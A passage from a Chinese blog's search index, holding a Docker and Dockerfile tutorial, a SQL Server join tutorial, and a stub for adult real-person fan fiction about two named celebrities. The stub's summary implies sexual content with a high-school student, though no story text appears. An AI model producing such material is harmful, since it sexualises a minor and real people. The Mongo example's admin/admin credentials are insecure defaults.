<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>docker 小结</title>
      <link href="docker.html"/>
      <url>docker.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h2 id="docker-启动-mongo-命令"><a href="#docker-启动-mongo-命令" class="headerlink" title="docker 启动 mongo 命令"></a>docker 启动 mongo 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mongo -p 27017:27017 -v mongodata:&#x2F;data&#x2F;db -e MONGO_INITDB_ROOT_USERNAME&#x3D;admin -e MONGO_INITDB_ROOT_PASSWORD&#x3D;admin -d mongo</span><br></pre></td></tr></table></figure><h2 id="docker-启动-redis"><a href="#docker-启动-redis" class="headerlink" title="docker 启动 redis"></a>docker 启动 redis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 6379:6379 --name redis -d</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="——————————————————————————————–"><a href="#——————————————————————————————–" class="headerlink" title="——————————————————————————————–"></a>——————————————————————————————–</h1><div class="article-body">        <div class="article-intro" id="content">            <h1>Docker Dockerfile </h1><h3>什么是 Dockerfile？</h3><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。</p><h3>使用 Dockerfile 定制镜像</h3><p>这里仅讲解如何运行 Dockerfile 文件来定制一个镜像，具体 Dockerfile 文件内指令详解，将在下一节中介绍，这里你只要知道构建的流程即可。</p><p><strong>1、下面以定制一个 nginx 镜像（构建好的镜像内会有一个 /usr/share/nginx/html/index.html 文件）</strong></p><p>在一个空目录下，新建一个名为 Dockerfile 文件，并在文件内添加以下内容：</p><pre class="prettyprint prettyprinted" style><span class="pln">FROM nginxRUN echo </span><span class="str">'这是一个本地构建的nginx镜像'</span><span class="pln"> </span><span class="pun">&gt;</span><span class="pln"> </span><span class="str">/usr/</span><span class="pln">share</span><span class="pun">/</span><span class="pln">nginx</span><span class="pun">/</span><span class="pln">html</span><span class="pun">/</span><span class="pln">index</span><span class="pun">.</span><span class="pln">html</span></pre><p><img data-src="https://www.runoob.com/wp-content/uploads/2019/11/dockerfile1.png" class="lazyload"></p><p><strong>2、FROM 和 RUN 指令的作用</strong></p><p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p><p><strong>RUN</strong>：用于执行后面跟着的命令行命令。有以下俩种格式：</p><p>shell 格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">RUN </span><span class="pun">&lt;命令行命令&gt;</span><span class="pln"></span><span class="com"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span></pre><p>exec 格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">RUN </span><span class="pun">[</span><span class="str">"可执行文件"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"参数1"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"参数2"</span><span class="pun">]</span><span class="pln"></span><span class="com"># 例如：</span><span class="pln"></span><span class="com"># RUN ["./test.php", "dev", "offline"] 等价于 RUN ./test.php dev offline</span></pre><p><strong>注意</strong>：Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。例如：</p><div class="example"> <div class="example_code">FROM centos<br>RUN <span style="color: #c20cb9; font-weight: bold;">yum install</span> <span style="color: #c20cb9; font-weight: bold;">wget</span><br>RUN <span style="color: #c20cb9; font-weight: bold;">wget</span> <span style="color: #660033;">-O</span> redis.tar.gz <span style="color: #a10;">"http://download.redis.io/releases/redis-5.0.3.tar.gz"</span><br>RUN <span style="color: #c20cb9; font-weight: bold;">tar</span> <span style="color: #660033;">-xvf</span> redis.tar.gz<br>以上执行会创建 <span style="color: #000000;">3</span> 层镜像。可简化为以下格式：<br>FROM centos<br>RUN <span style="color: #c20cb9; font-weight: bold;">yum install</span> <span style="color: #c20cb9; font-weight: bold;">wget</span> \<br>&nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: #c20cb9; font-weight: bold;">wget</span> <span style="color: #660033;">-O</span> redis.tar.gz <span style="color: #a10;">"http://download.redis.io/releases/redis-5.0.3.tar.gz"</span> \<br>&nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: #c20cb9; font-weight: bold;">tar</span> <span style="color: #660033;">-xvf</span> redis.tar.gz<br></div></div><p>如上，以 <span class="marked">&amp;&amp;</span> 符号连接命令，这样执行后，只会创建 1 层镜像。</p><h3>开始构建镜像</h3><p>在 Dockerfile 文件的存放目录下，执行构建动作。</p><p>以下示例，通过目录下的 Dockerfile 构建一个 nginx:v3（镜像名称:镜像标签）。</p><p><strong>注</strong>：最后的  <span class="marked">.</span>  代表本次执行的上下文路径，下一节会介绍。</p><div class="example"> <div class="example_code">$ docker build <span style="color: #660033;">-t</span> nginx:v3 .<br></div></div><p><img data-src="https://www.runoob.com/wp-content/uploads/2019/11/dockerfile2.png" class="lazyload"></p><p>以上显示，说明已经构建成功。</p><h3>上下文路径</h3><p>上一节中，有提到指令最后一个  <span class="marked">.</span>  是上下文路径，那么什么是上下文路径呢？</p><div class="example"><div class="example_code">$ docker build <span style="color: #660033;">-t</span> nginx:v3 .<br></div></div><p>上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。</p><p><strong>解析</strong>：由于 docker 的运行模式是 C/S。我们本机是 C，docker 引擎是 S。实际的构建过程是在 docker 引擎下完成的，所以这个时候无法用到我们本机的文件。这就需要把我们本机的指定目录下的文件一起打包提供给 docker 引擎使用。</p><p>如果未说明最后一个参数，那么默认上下文路径就是 Dockerfile 所在的位置。</p><p><strong>注意</strong>：上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。</p><hr><h2>指令详解</h2> <h3>COPY</h3><p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">COPY </span><span class="pun">[--</span><span class="pln">chown</span><span class="pun">=&lt;</span><span class="pln">user</span><span class="pun">&gt;:&lt;</span><span class="kwd">group</span><span class="pun">&gt;]</span><span class="pln"> </span><span class="pun">&lt;源路径</span><span class="lit">1</span><span class="pun">&gt;...</span><span class="pln">  </span><span class="pun">&lt;目标路径&gt;</span><span class="pln">COPY </span><span class="pun">[--</span><span class="pln">chown</span><span class="pun">=&lt;</span><span class="pln">user</span><span class="pun">&gt;:&lt;</span><span class="kwd">group</span><span class="pun">&gt;]</span><span class="pln"> </span><span class="pun">[</span><span class="str">"&lt;源路径1&gt;"</span><span class="pun">,...</span><span class="pln">  </span><span class="str">"&lt;目标路径&gt;"</span><span class="pun">]</span></pre><p><strong>[--chown=&lt;user&gt;:&lt;group&gt;]</strong>：可选参数，用户改变复制到容器内文件的拥有者和属组。</p><p><strong>&lt;源路径&gt;</strong>：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。例如：</p><pre class="prettyprint prettyprinted" style><span class="pln">COPY hom</span><span class="pun">*</span><span class="pln"> </span><span class="str">/mydir/</span><span class="pln">COPY hom</span><span class="pun">?.</span><span class="pln">txt </span><span class="pun">/</span><span class="pln">mydir</span><span class="pun">/</span></pre><p><strong>&lt;目标路径&gt;</strong>：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。</p><h3>ADD</h3><p>ADD 指令和 COPY 的使用格式一致（同样需求下，官方推荐使用 COPY）。功能也类似，不同之处如下：</p><ul><li>ADD 的优点：在执行 &lt;源文件&gt; 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 &lt;目标路径&gt;。</li><li>ADD 的缺点：在不解压的前提下，无法复制 tar 压缩文件。会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。具体是否使用，可以根据是否需要自动解压来决定。</li></ul><h3>CMD</h3><p>类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:</p><ul><li>CMD 在docker run 时运行。</li><li>RUN 是在 docker build。</li></ul><p><strong>作用</strong>：为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。CMD 指令指定的程序可被 docker run 命令行参数中指定要运行的程序所覆盖。</p><p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">CMD </span><span class="pun">&lt;</span><span class="pln">shell </span><span class="pun">命令&gt;</span><span class="pln"> CMD </span><span class="pun">[</span><span class="str">"&lt;可执行文件或命令&gt;"</span><span class="pun">,</span><span class="str">"&lt;param1&gt;"</span><span class="pun">,</span><span class="str">"&lt;param2&gt;"</span><span class="pun">,...]</span><span class="pln"> CMD </span><span class="pun">[</span><span class="str">"&lt;param1&gt;"</span><span class="pun">,</span><span class="str">"&lt;param2&gt;"</span><span class="pun">,...]</span><span class="pln">  </span><span class="com"># 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span></pre><p>推荐使用第二种格式，执行过程比较明确。第一种格式实际上在运行的过程中也会自动转换成第二种格式运行，并且默认可执行文件是 sh。</p><h3>ENTRYPOINT</h3><p>类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序。</p><p>但是, 如果运行 docker run 时使用了 --entrypoint 选项，将覆盖 CMD 指令指定的程序。</p><p><strong>优点</strong>：在执行 docker run 的时候可以指定 ENTRYPOINT 运行所需的参数。</p><p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">ENTRYPOINT </span><span class="pun">[</span><span class="str">"&lt;executeable&gt;"</span><span class="pun">,</span><span class="str">"&lt;param1&gt;"</span><span class="pun">,</span><span class="str">"&lt;param2&gt;"</span><span class="pun">,...]</span></pre><p>可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参，以下示例会提到。</p><p>示例：</p><p>假设已通过 Dockerfile 构建了 nginx:test 镜像：</p><pre class="prettyprint prettyprinted" style><span class="pln">FROM nginx<p>ENTRYPOINT </p></span><span class="pun">[</span><span class="str">“nginx”</span><span class="pun">,</span><span class="pln"> </span><span class="str">“-c”</span><span class="pun">]</span><span class="pln"> </span><span class="com"># 定参</span><span class="pln"><br>CMD </span><span class="pun">[</span><span class="str">“/etc/nginx/nginx.conf”</span><span class="pun">]</span><span class="pln"> </span><span class="com"># 变参 </span></pre><p></p><p>1、不传参运行</p><pre class="prettyprint prettyprinted" style><span class="pln">$ docker run  nginx</span><span class="pun">:</span><span class="pln">test</span></pre><p>容器内会默认运行以下命令，启动主进程。</p><pre class="prettyprint prettyprinted" style><span class="pln">nginx </span><span class="pun">-</span><span class="pln">c </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">nginx</span><span class="pun">/</span><span class="pln">nginx</span><span class="pun">.</span><span class="pln">conf</span></pre><p>2、传参运行</p><pre class="prettyprint prettyprinted" style><span class="pln">$ docker run  nginx</span><span class="pun">:</span><span class="pln">test </span><span class="pun">-</span><span class="pln">c </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">nginx</span><span class="pun">/</span><span class="kwd">new</span><span class="pun">.</span><span class="pln">conf</span></pre><p>容器内会默认运行以下命令，启动主进程(/etc/nginx/new.conf:假设容器内已有此文件)</p><pre class="prettyprint prettyprinted" style><span class="pln">nginx </span><span class="pun">-</span><span class="pln">c </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">nginx</span><span class="pun">/</span><span class="kwd">new</span><span class="pun">.</span><span class="pln">conf</span></pre><h3>ENV</h3><p>设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">ENV </span><span class="str">&lt;key&gt;</span><span class="pln"> </span><span class="str">&lt;value&gt;</span><span class="pln">ENV </span><span class="str">&lt;key1&gt;</span><span class="pun">=&lt;</span><span class="pln">value1</span><span class="pun">&gt;</span><span class="pln"> </span><span class="str">&lt;key2&gt;</span><span class="pun">=&lt;</span><span class="pln">value2</span><span class="pun">&gt;...</span></pre><p>以下示例设置 NODE_VERSION = 7.2.0 ， 在后续的指令中可以通过 $NODE_VERSION 引用：</p><pre class="prettyprint prettyprinted" style><span class="pln">ENV NODE_VERSION </span><span class="lit">7.2</span><span class="pun">.</span><span class="lit">0</span><span class="pln"><p>RUN curl </p></span><span class="pun">-</span><span class="pln">SLO </span><span class="str">“<a href="https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz&quot;">https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz&quot;</a></span><span class="pln"> <br> </span><span class="pun">&amp;&amp;</span><span class="pln"> curl </span><span class="pun">-</span><span class="pln">SLO </span><span class="str">“<a href="https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc&quot;">https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc&quot;</a></span></pre><p></p><h3>ARG </h3><p>构建参数，与 ENV 作用一至。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。</p><p>构建命令 docker build 中可以用 --build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">ARG </span><span class="pun">&lt;参数名&gt;[=&lt;默认值&gt;]</span></pre><h3>VOLUME</h3><p>定义匿名数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷。</p><p>作用：</p><ul><li>避免重要的数据，因容器重启而丢失，这是非常致命的。</li><li>避免容器不断变大。</li></ul><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">VOLUME </span><span class="pun">[</span><span class="str">"&lt;路径1&gt;"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"&lt;路径2&gt;"</span><span class="pun">...]</span><span class="pln">VOLUME </span><span class="pun">&lt;路径&gt;</span></pre><p>在启动容器 docker run 的时候，我们可以通过 -v 参数修改挂载点。</p><h3>EXPOSE </h3><p>仅仅只是声明端口。</p><p>作用：</p><ul><li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。</li><li>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</li></ul><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">EXPOSE </span><span class="pun">&lt;端口</span><span class="lit">1</span><span class="pun">&gt;</span><span class="pln"> </span><span class="pun">[&lt;端口</span><span class="lit">2</span><span class="pun">&gt;...]</span></pre><h3>WORKDIR</h3><p>指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。</p><p>docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">WORKDIR </span><span class="pun">&lt;工作目录路径&gt;</span></pre><h3>USER </h3><p>用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（用户和用户组必须提前已经存在）。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">USER </span><span class="pun">&lt;用户名&gt;[:&lt;用户组&gt;]</span></pre><h3>HEALTHCHECK</h3><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">HEALTHCHECK </span><span class="pun">[选项]</span><span class="pln"> CMD </span><span class="pun">&lt;命令&gt;：设置检查容器健康状况的命令</span><span class="pln">HEALTHCHECK NONE</span><span class="pun">：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</span><span class="pln"><p>HEALTHCHECK </p></span><span class="pun">[选项]</span><span class="pln"> CMD </span><span class="pun">&lt;命令&gt;</span><span class="pln"> </span><span class="pun">:</span><span class="pln"> </span><span class="pun">这边</span><span class="pln"> CMD </span><span class="pun">后面跟随的命令使用，可以参考</span><span class="pln"> CMD </span><span class="pun">的用法。</span></pre><p></p><h3>ONBUILD </h3><p>用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为 test-build）。当有新的 Dockerfile 使用了之前构建的镜像 FROM test-build ，这是执行新镜像的 Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 ONBUILD 指定的命令。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">ONBUILD </span><span class="pun">&lt;其它指令&gt;</span></pre>            <!-- 其他扩展 --><pre><code>    &lt;/div&gt;&lt;/div&gt;</code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《下坠》王一博/肖战Chapter 1</title>
      <link href="%E3%80%8A%E4%B8%8B%E5%9D%A0%E3%80%8B%E7%8E%8B%E4%B8%80%E5%8D%9A&amp;%E8%82%96%E6%88%98Chapter%201%EF%BC%88%E6%9C%AA%E6%88%90%E5%B9%B4%E4%BA%BA%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE%E6%9C%AC%E9%A1%B5%EF%BC%81%EF%BC%89.html"/>
      <url>%E3%80%8A%E4%B8%8B%E5%9D%A0%E3%80%8B%E7%8E%8B%E4%B8%80%E5%8D%9A&amp;%E8%82%96%E6%88%98Chapter%201%EF%BC%88%E6%9C%AA%E6%88%90%E5%B9%B4%E4%BA%BA%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE%E6%9C%AC%E9%A1%B5%EF%BC%81%EF%BC%89.html</url>
      
        <content type="html"><![CDATA[<h1 id="未成年人禁止访问本页！！！本站不负责"><a href="#未成年人禁止访问本页！！！本站不负责" class="headerlink" title="未成年人禁止访问本页！！！本站不负责"></a>未成年人禁止访问本页！！！本站不负责</h1><p><br><br><br><img data-src="https://cdn.jsdelivr.net/gh/yujiajie01/imgHosting/yujiajie01-picfbi.jpg" class="lazyload"></p><p><br><br><br><br><br><br><br><br><br><br><br><br></p><blockquote><p>文章为转载内容，阅读原文请科学上网访问：<a href=" https://archiveofourown.org/works/22478632/chapters/53712151" rel="nofollow">传送门</a></p></blockquote><h2 class="title heading">      《下坠》/MaiLeDiDiDi       </h2><h3>Summary:（女装大佬）发廊妹x男高中生</h3>]]></content>
      
      
      <categories>
          
          <category> 同人小说 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《下坠》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL 深入&quot;了解&quot; sqlserver 表连接 join　及性能调优化</title>
      <link href="SQL%E6%B7%B1%E5%85%A5%E2%80%9C%E4%BA%86%E8%A7%A3%E2%80%9D%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html"/>
      <url>SQL%E6%B7%B1%E5%85%A5%E2%80%9C%E4%BA%86%E8%A7%A3%E2%80%9D%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><!--页面头部添加--><h1 id="SQL-深入”了解”-sqlserver-表连接-join-及性能调优化"><a href="#SQL-深入”了解”-sqlserver-表连接-join-及性能调优化" class="headerlink" title="SQL  深入”了解”  sqlserver 表连接 join　及性能调优化"></a>SQL  深入”了解”  sqlserver 表连接 join　及性能调优化</h1><p>　问题 :</p><div id="cnblogs_post_body"><p>　　　　　1.什么是内连接(inner)和外联结(outer)</p><p>　　　　　2. SQL server 表连接 (FROM--AND 法, JOIN -- ON 法)的区别.</p><p>　　　　　3.表连接及多表连接的SQL语句执行顺序,和性能调优.</p><hr><h2 id="1-第一个问题，首先要明白如何使用JOIN-和-ON-关键字作表连接。"><a href="#1-第一个问题，首先要明白如何使用JOIN-和-ON-关键字作表连接。" class="headerlink" title="1.第一个问题，首先要明白如何使用JOIN 和 ON 关键字作表连接。"></a>1.第一个问题，首先要明白如何使用JOIN 和 ON 关键字作表连接。</h2><p>　　　　<span style="color: #cc99ff;">申明：下文中所用的等价，可能指的是逻辑上的等价(即产生相同的结果集)，也可能是执行顺序上的等价，甚至是所产生的执行计划或者执行效率等价。因为很多时候用户只要写普通的sql ，而sql server 会跟据自己的优化 配置和执行计划，产生执行步骤，这些步骤也许和你写的sql很符合，也许更优，当然也可能不符合你的需求。这需要很多的积累，我也只是浅尝辄止，所以没有能力做过多论述。具体问题具体分析，这里只能提供大体思路。</span></p><h3 id="1）join-的5种方式-："><a href="#1）join-的5种方式-：" class="headerlink" title="1）join 的5种方式 ："></a>1）join 的5种方式 ：</h3><p>　　　　inner join ; left join; right join; full join; cross join;</p><p>　　　　其中inner&nbsp; join可以省去inner 关键字。 left/right join 与left/right out join 等价。</p><p>　　　　full join 与 同时 left join&nbsp;和 right join 等价。</p><p>　　　　cross join 为将两张表笛卡尔集　　　</p><p>　</p><hr><p>&nbsp;</p><h3 id="2-JOIN-–-ON-语句的执行顺序："><a href="#2-JOIN-–-ON-语句的执行顺序：" class="headerlink" title="2) JOIN – ON 语句的执行顺序："></a>2) JOIN – ON 语句的执行顺序：</h3><p>　　　　例句：</p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT <span style="color: #808080;">* <span style="color: #0000ff;">FROM A <span style="color: #808080;">LEFT <span style="color: #808080;">JOIN B <span style="color: #0000ff;">ON A.ID <span style="color: #808080;">= B.ID <span style="color: #808080;">AND A<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0 <span style="color: #0000ff;">WHERE A.name <span style="color: #808080;">= <span style="color: #ff0000;">'<span style="color: #ff0000;">x<span style="color: #ff0000;">'  </span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre></div><p>　　　　注意在作on&nbsp; 连接后 的and 子句 和where 子句 。&nbsp; 他们有什么不同！。。。。。。</p><p>　　　<strong>　逻辑上解释：(不考虑执行计划中执行步骤和作嵌套连接等具体方式，这里只讨论如何思考逻辑上的步骤)　</strong></p><p>　　　　　　　　执行顺序是： FROM --&gt; JOIN --&gt; ON --&gt;AND--&gt;　LEFT--&gt; WHERE --&gt;SELECT</p><p>　　　　　　　　A步骤. 先将两张表根据ON 条件 作连接（逻辑上，相等于将两张表笛卡尔集后根据ID相等条件筛选数据，实际情况后面分析）　</p><p>　　　　　　　　B步骤. 根据ON 后面,WHERE&nbsp;之前&nbsp;的 AND 条件筛选数据</p><p>　　　　　　　　C步骤. 跟据LEFT 无论如何，要保证A表的数据完整性。所以在上一步骤产生的结果集中<span style="color: #ff0000;">补齐A表因无法比与B表匹配而被AND 条件筛选的掉的数据；</span></p><p>　　　　　　　　D步骤. 再根据WHERE筛选结果集。　</p><p>　　　　示例：（为了能更好的这一过程，通过实例先思考）</p><p>　　　　　　　　</p><div class="cnblogs_code"><pre><span style="color: #0000ff;">CREATE <span style="color: #0000ff;">TABLE EMPLOY  (NAME    <span style="color: #0000ff;">VARCHAR(<span style="color: #800000; font-weight: bold;">10),     DEPTNO    <span style="color: #0000ff;">INTEGER<span style="color: #000000;"> );     <p><span style="color: #0000ff;">INSERT <span style="color: #0000ff;">INTO EMPLOY (NAME, DEPTNO) <span style="color: #0000ff;">VALUES<span style="color: #000000;"><br> (<span style="color: #ff0000;">‘<span style="color: #ff0000;">张三<span style="color: #ff0000;">‘,<span style="color: #800000; font-weight: bold;">10<span style="color: #000000;">),<br> (<span style="color: #ff0000;">‘<span style="color: #ff0000;">李四<span style="color: #ff0000;">‘,<span style="color: #800000; font-weight: bold;">20<span style="color: #000000;">),<br> (<span style="color: #ff0000;">‘<span style="color: #ff0000;">王五<span style="color: #ff0000;">‘,<span style="color: #800000; font-weight: bold;">10<span style="color: #000000;">),<br> (<span style="color: #ff0000;">‘<span style="color: #ff0000;">赵红<span style="color: #ff0000;">‘,<span style="color: #800000; font-weight: bold;">20<span style="color: #000000;">);    </p><p><span style="color: #0000ff;">CREATE <span style="color: #0000ff;">TABLE DEPARTMENT  (DEPTNO    <span style="color: #0000ff;">INTEGER,      DEPTNAME    <span style="color: #0000ff;">VARCHAR(<span style="color: #800000; font-weight: bold;">10<span style="color: #000000;">) ); </p><p><span style="color: #0000ff;">INSERT <span style="color: #0000ff;">INTO DEPARTMENT (DEPTNO, DEPTNAME) <span style="color: #0000ff;">VALUES<span style="color: #000000;"><br>(<span style="color: #800000; font-weight: bold;">10, <span style="color: #ff0000;">‘<span style="color: #ff0000;">市场部<span style="color: #ff0000;">‘<span style="color: #000000;">),<br>(<span style="color: #800000; font-weight: bold;">20, <span style="color: #ff0000;">‘<span style="color: #ff0000;">技术部<span style="color: #ff0000;">‘<span style="color: #000000;">);</p><p><span style="color: #008080;">–<span style="color: #008080;">查询一下所有的员工的姓名和部门名为市场部的部门 </span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre></p><p>　　　　</p><p>也许你的SQL 会写成这样：</p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT<span style="color: #000000;"> E.NAME,D.DEPTNAME <span style="color: #0000ff;">FROM EMPLOY  E <span style="color: #808080;">LEFT <span style="color: #808080;">JOIN DEPARTMENT D <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=<span style="color: #000000;">D.DEPTNO   <span style="color: #0000ff;">WHERE D.DEPTNAME<span style="color: #808080;">=<span style="color: #ff0000;">'<span style="color: #ff0000;">市场部<span style="color: #ff0000;">' </span></span></span></span></span></span></span></span></span></span></span></span></span></pre></div><p>仔细读题目，是要查询“所有”员工的姓名，所以肯定要保证员工表的数据完整性。如果使用where，当然不能保证员工表的完整拉。</p><p>还记得 <span style="color: #ff0000;">在 ON 关键字后 ，WHERE 关键字前的条件筛选方式么？？？</span></p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT E.NAME,D.DEPTNAME <span style="color: #0000ff;">FROM EMPLOY  E <span style="color: #808080;">LEFT <span style="color: #808080;">JOIN DEPARTMENT D <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=D.DEPTNO <span style="color: #808080;">AND D.DEPTNAME<span style="color: #808080;">=<span style="color: #ff0000;">'<span style="color: #ff0000;">市场部<span style="color: #ff0000;">'  </span></span></span></span></span></span></span></span></span></span></span></pre></div><p>这样就对了！！</p><p>产生的结果很奇怪</p><p>张三&nbsp;市场部 李四&nbsp;NULL 王五&nbsp;市场部 赵红&nbsp;NULL</p><p>为什么结果是这样呢？　深入理解下前面所说的SQL 语句执行顺序&nbsp;</p><p>　　　　举个例子：分别执行看看结果，结合上个例子想想(以下ABC步骤意思是前面说的ABCD四个步骤)</p><div class="cnblogs_code"><pre><span style="color: #008080;">--<span style="color: #008080;">执行A步骤等价的逻辑SQL<span style="color: #0000ff;">SELECT <span style="color: #808080;">* <span style="color: #0000ff;">FROM EMPLOY  E   <span style="color: #808080;">JOIN DEPARTMENT D   <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=<span style="color: #000000;">D.DEPTNO<span style="color: #008080;">--<span style="color: #008080;">执行B步骤等价的逻辑SQL<span style="color: #0000ff;">SELECT <span style="color: #808080;">* <span style="color: #0000ff;">FROM EMPLOY  E   <span style="color: #808080;">JOIN DEPARTMENT D   <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=D.DEPTNO <span style="color: #808080;">and  D.DEPTNO<span style="color: #808080;">=<span style="color: #800000; font-weight: bold;">40<span style="color: #008080;">--<span style="color: #008080;">执行C步骤等价的逻辑SQL<span style="color: #0000ff;">SELECT <span style="color: #808080;">* <span style="color: #0000ff;">FROM EMPLOY  E  <span style="color: #808080;">left <span style="color: #808080;">JOIN DEPARTMENT D   <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=D.DEPTNO <span style="color: #808080;">and  D.DEPTNO<span style="color: #808080;">=<span style="color: #800000; font-weight: bold;">40</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre><h3 id="3-表连接在执行计划，或者是真正的执行方式："><a href="#3-表连接在执行计划，或者是真正的执行方式：" class="headerlink" title="3)表连接在执行计划，或者是真正的执行方式："></a>3)表连接在执行计划，或者是真正的执行方式：</h3><p>　　首先要理解下执行计划，看看SQL语句如何在　SQL SERVER&nbsp;&nbsp; 内部中真正实现这些复杂操作；其中SQL SERVER JOIN 的三种方式（<span style="color: #ff0000;">Nested Loops join，Merge Join，Hash Join）要有所了解。如果不懂，可以去<a href="http://www.cnblogs.com/fish-li/archive/2011/06/06/2073626.html">http://www.cnblogs.com/fish-li/archive/2011/06/06/2073626.html</a>　看看学习。</span></p><p>　　我的私人理解：</p><p>　　　　A. Nested Loops join :外表县进行逐条扫描，而内表，根据ＯＮ的连接条件，快速ＳＥＥＫ内表看是否有符合的数据（ＳＥＥＫ不是ＳＣＡＮ）。这样产生两张表ＪＯＩＮ后集合。</p><p>　　　&nbsp; B. Merge Join : 用于两张表差不多大，而且在连接字段上有索引。</p><p>　　　 C.&nbsp;&nbsp;Hash Join : 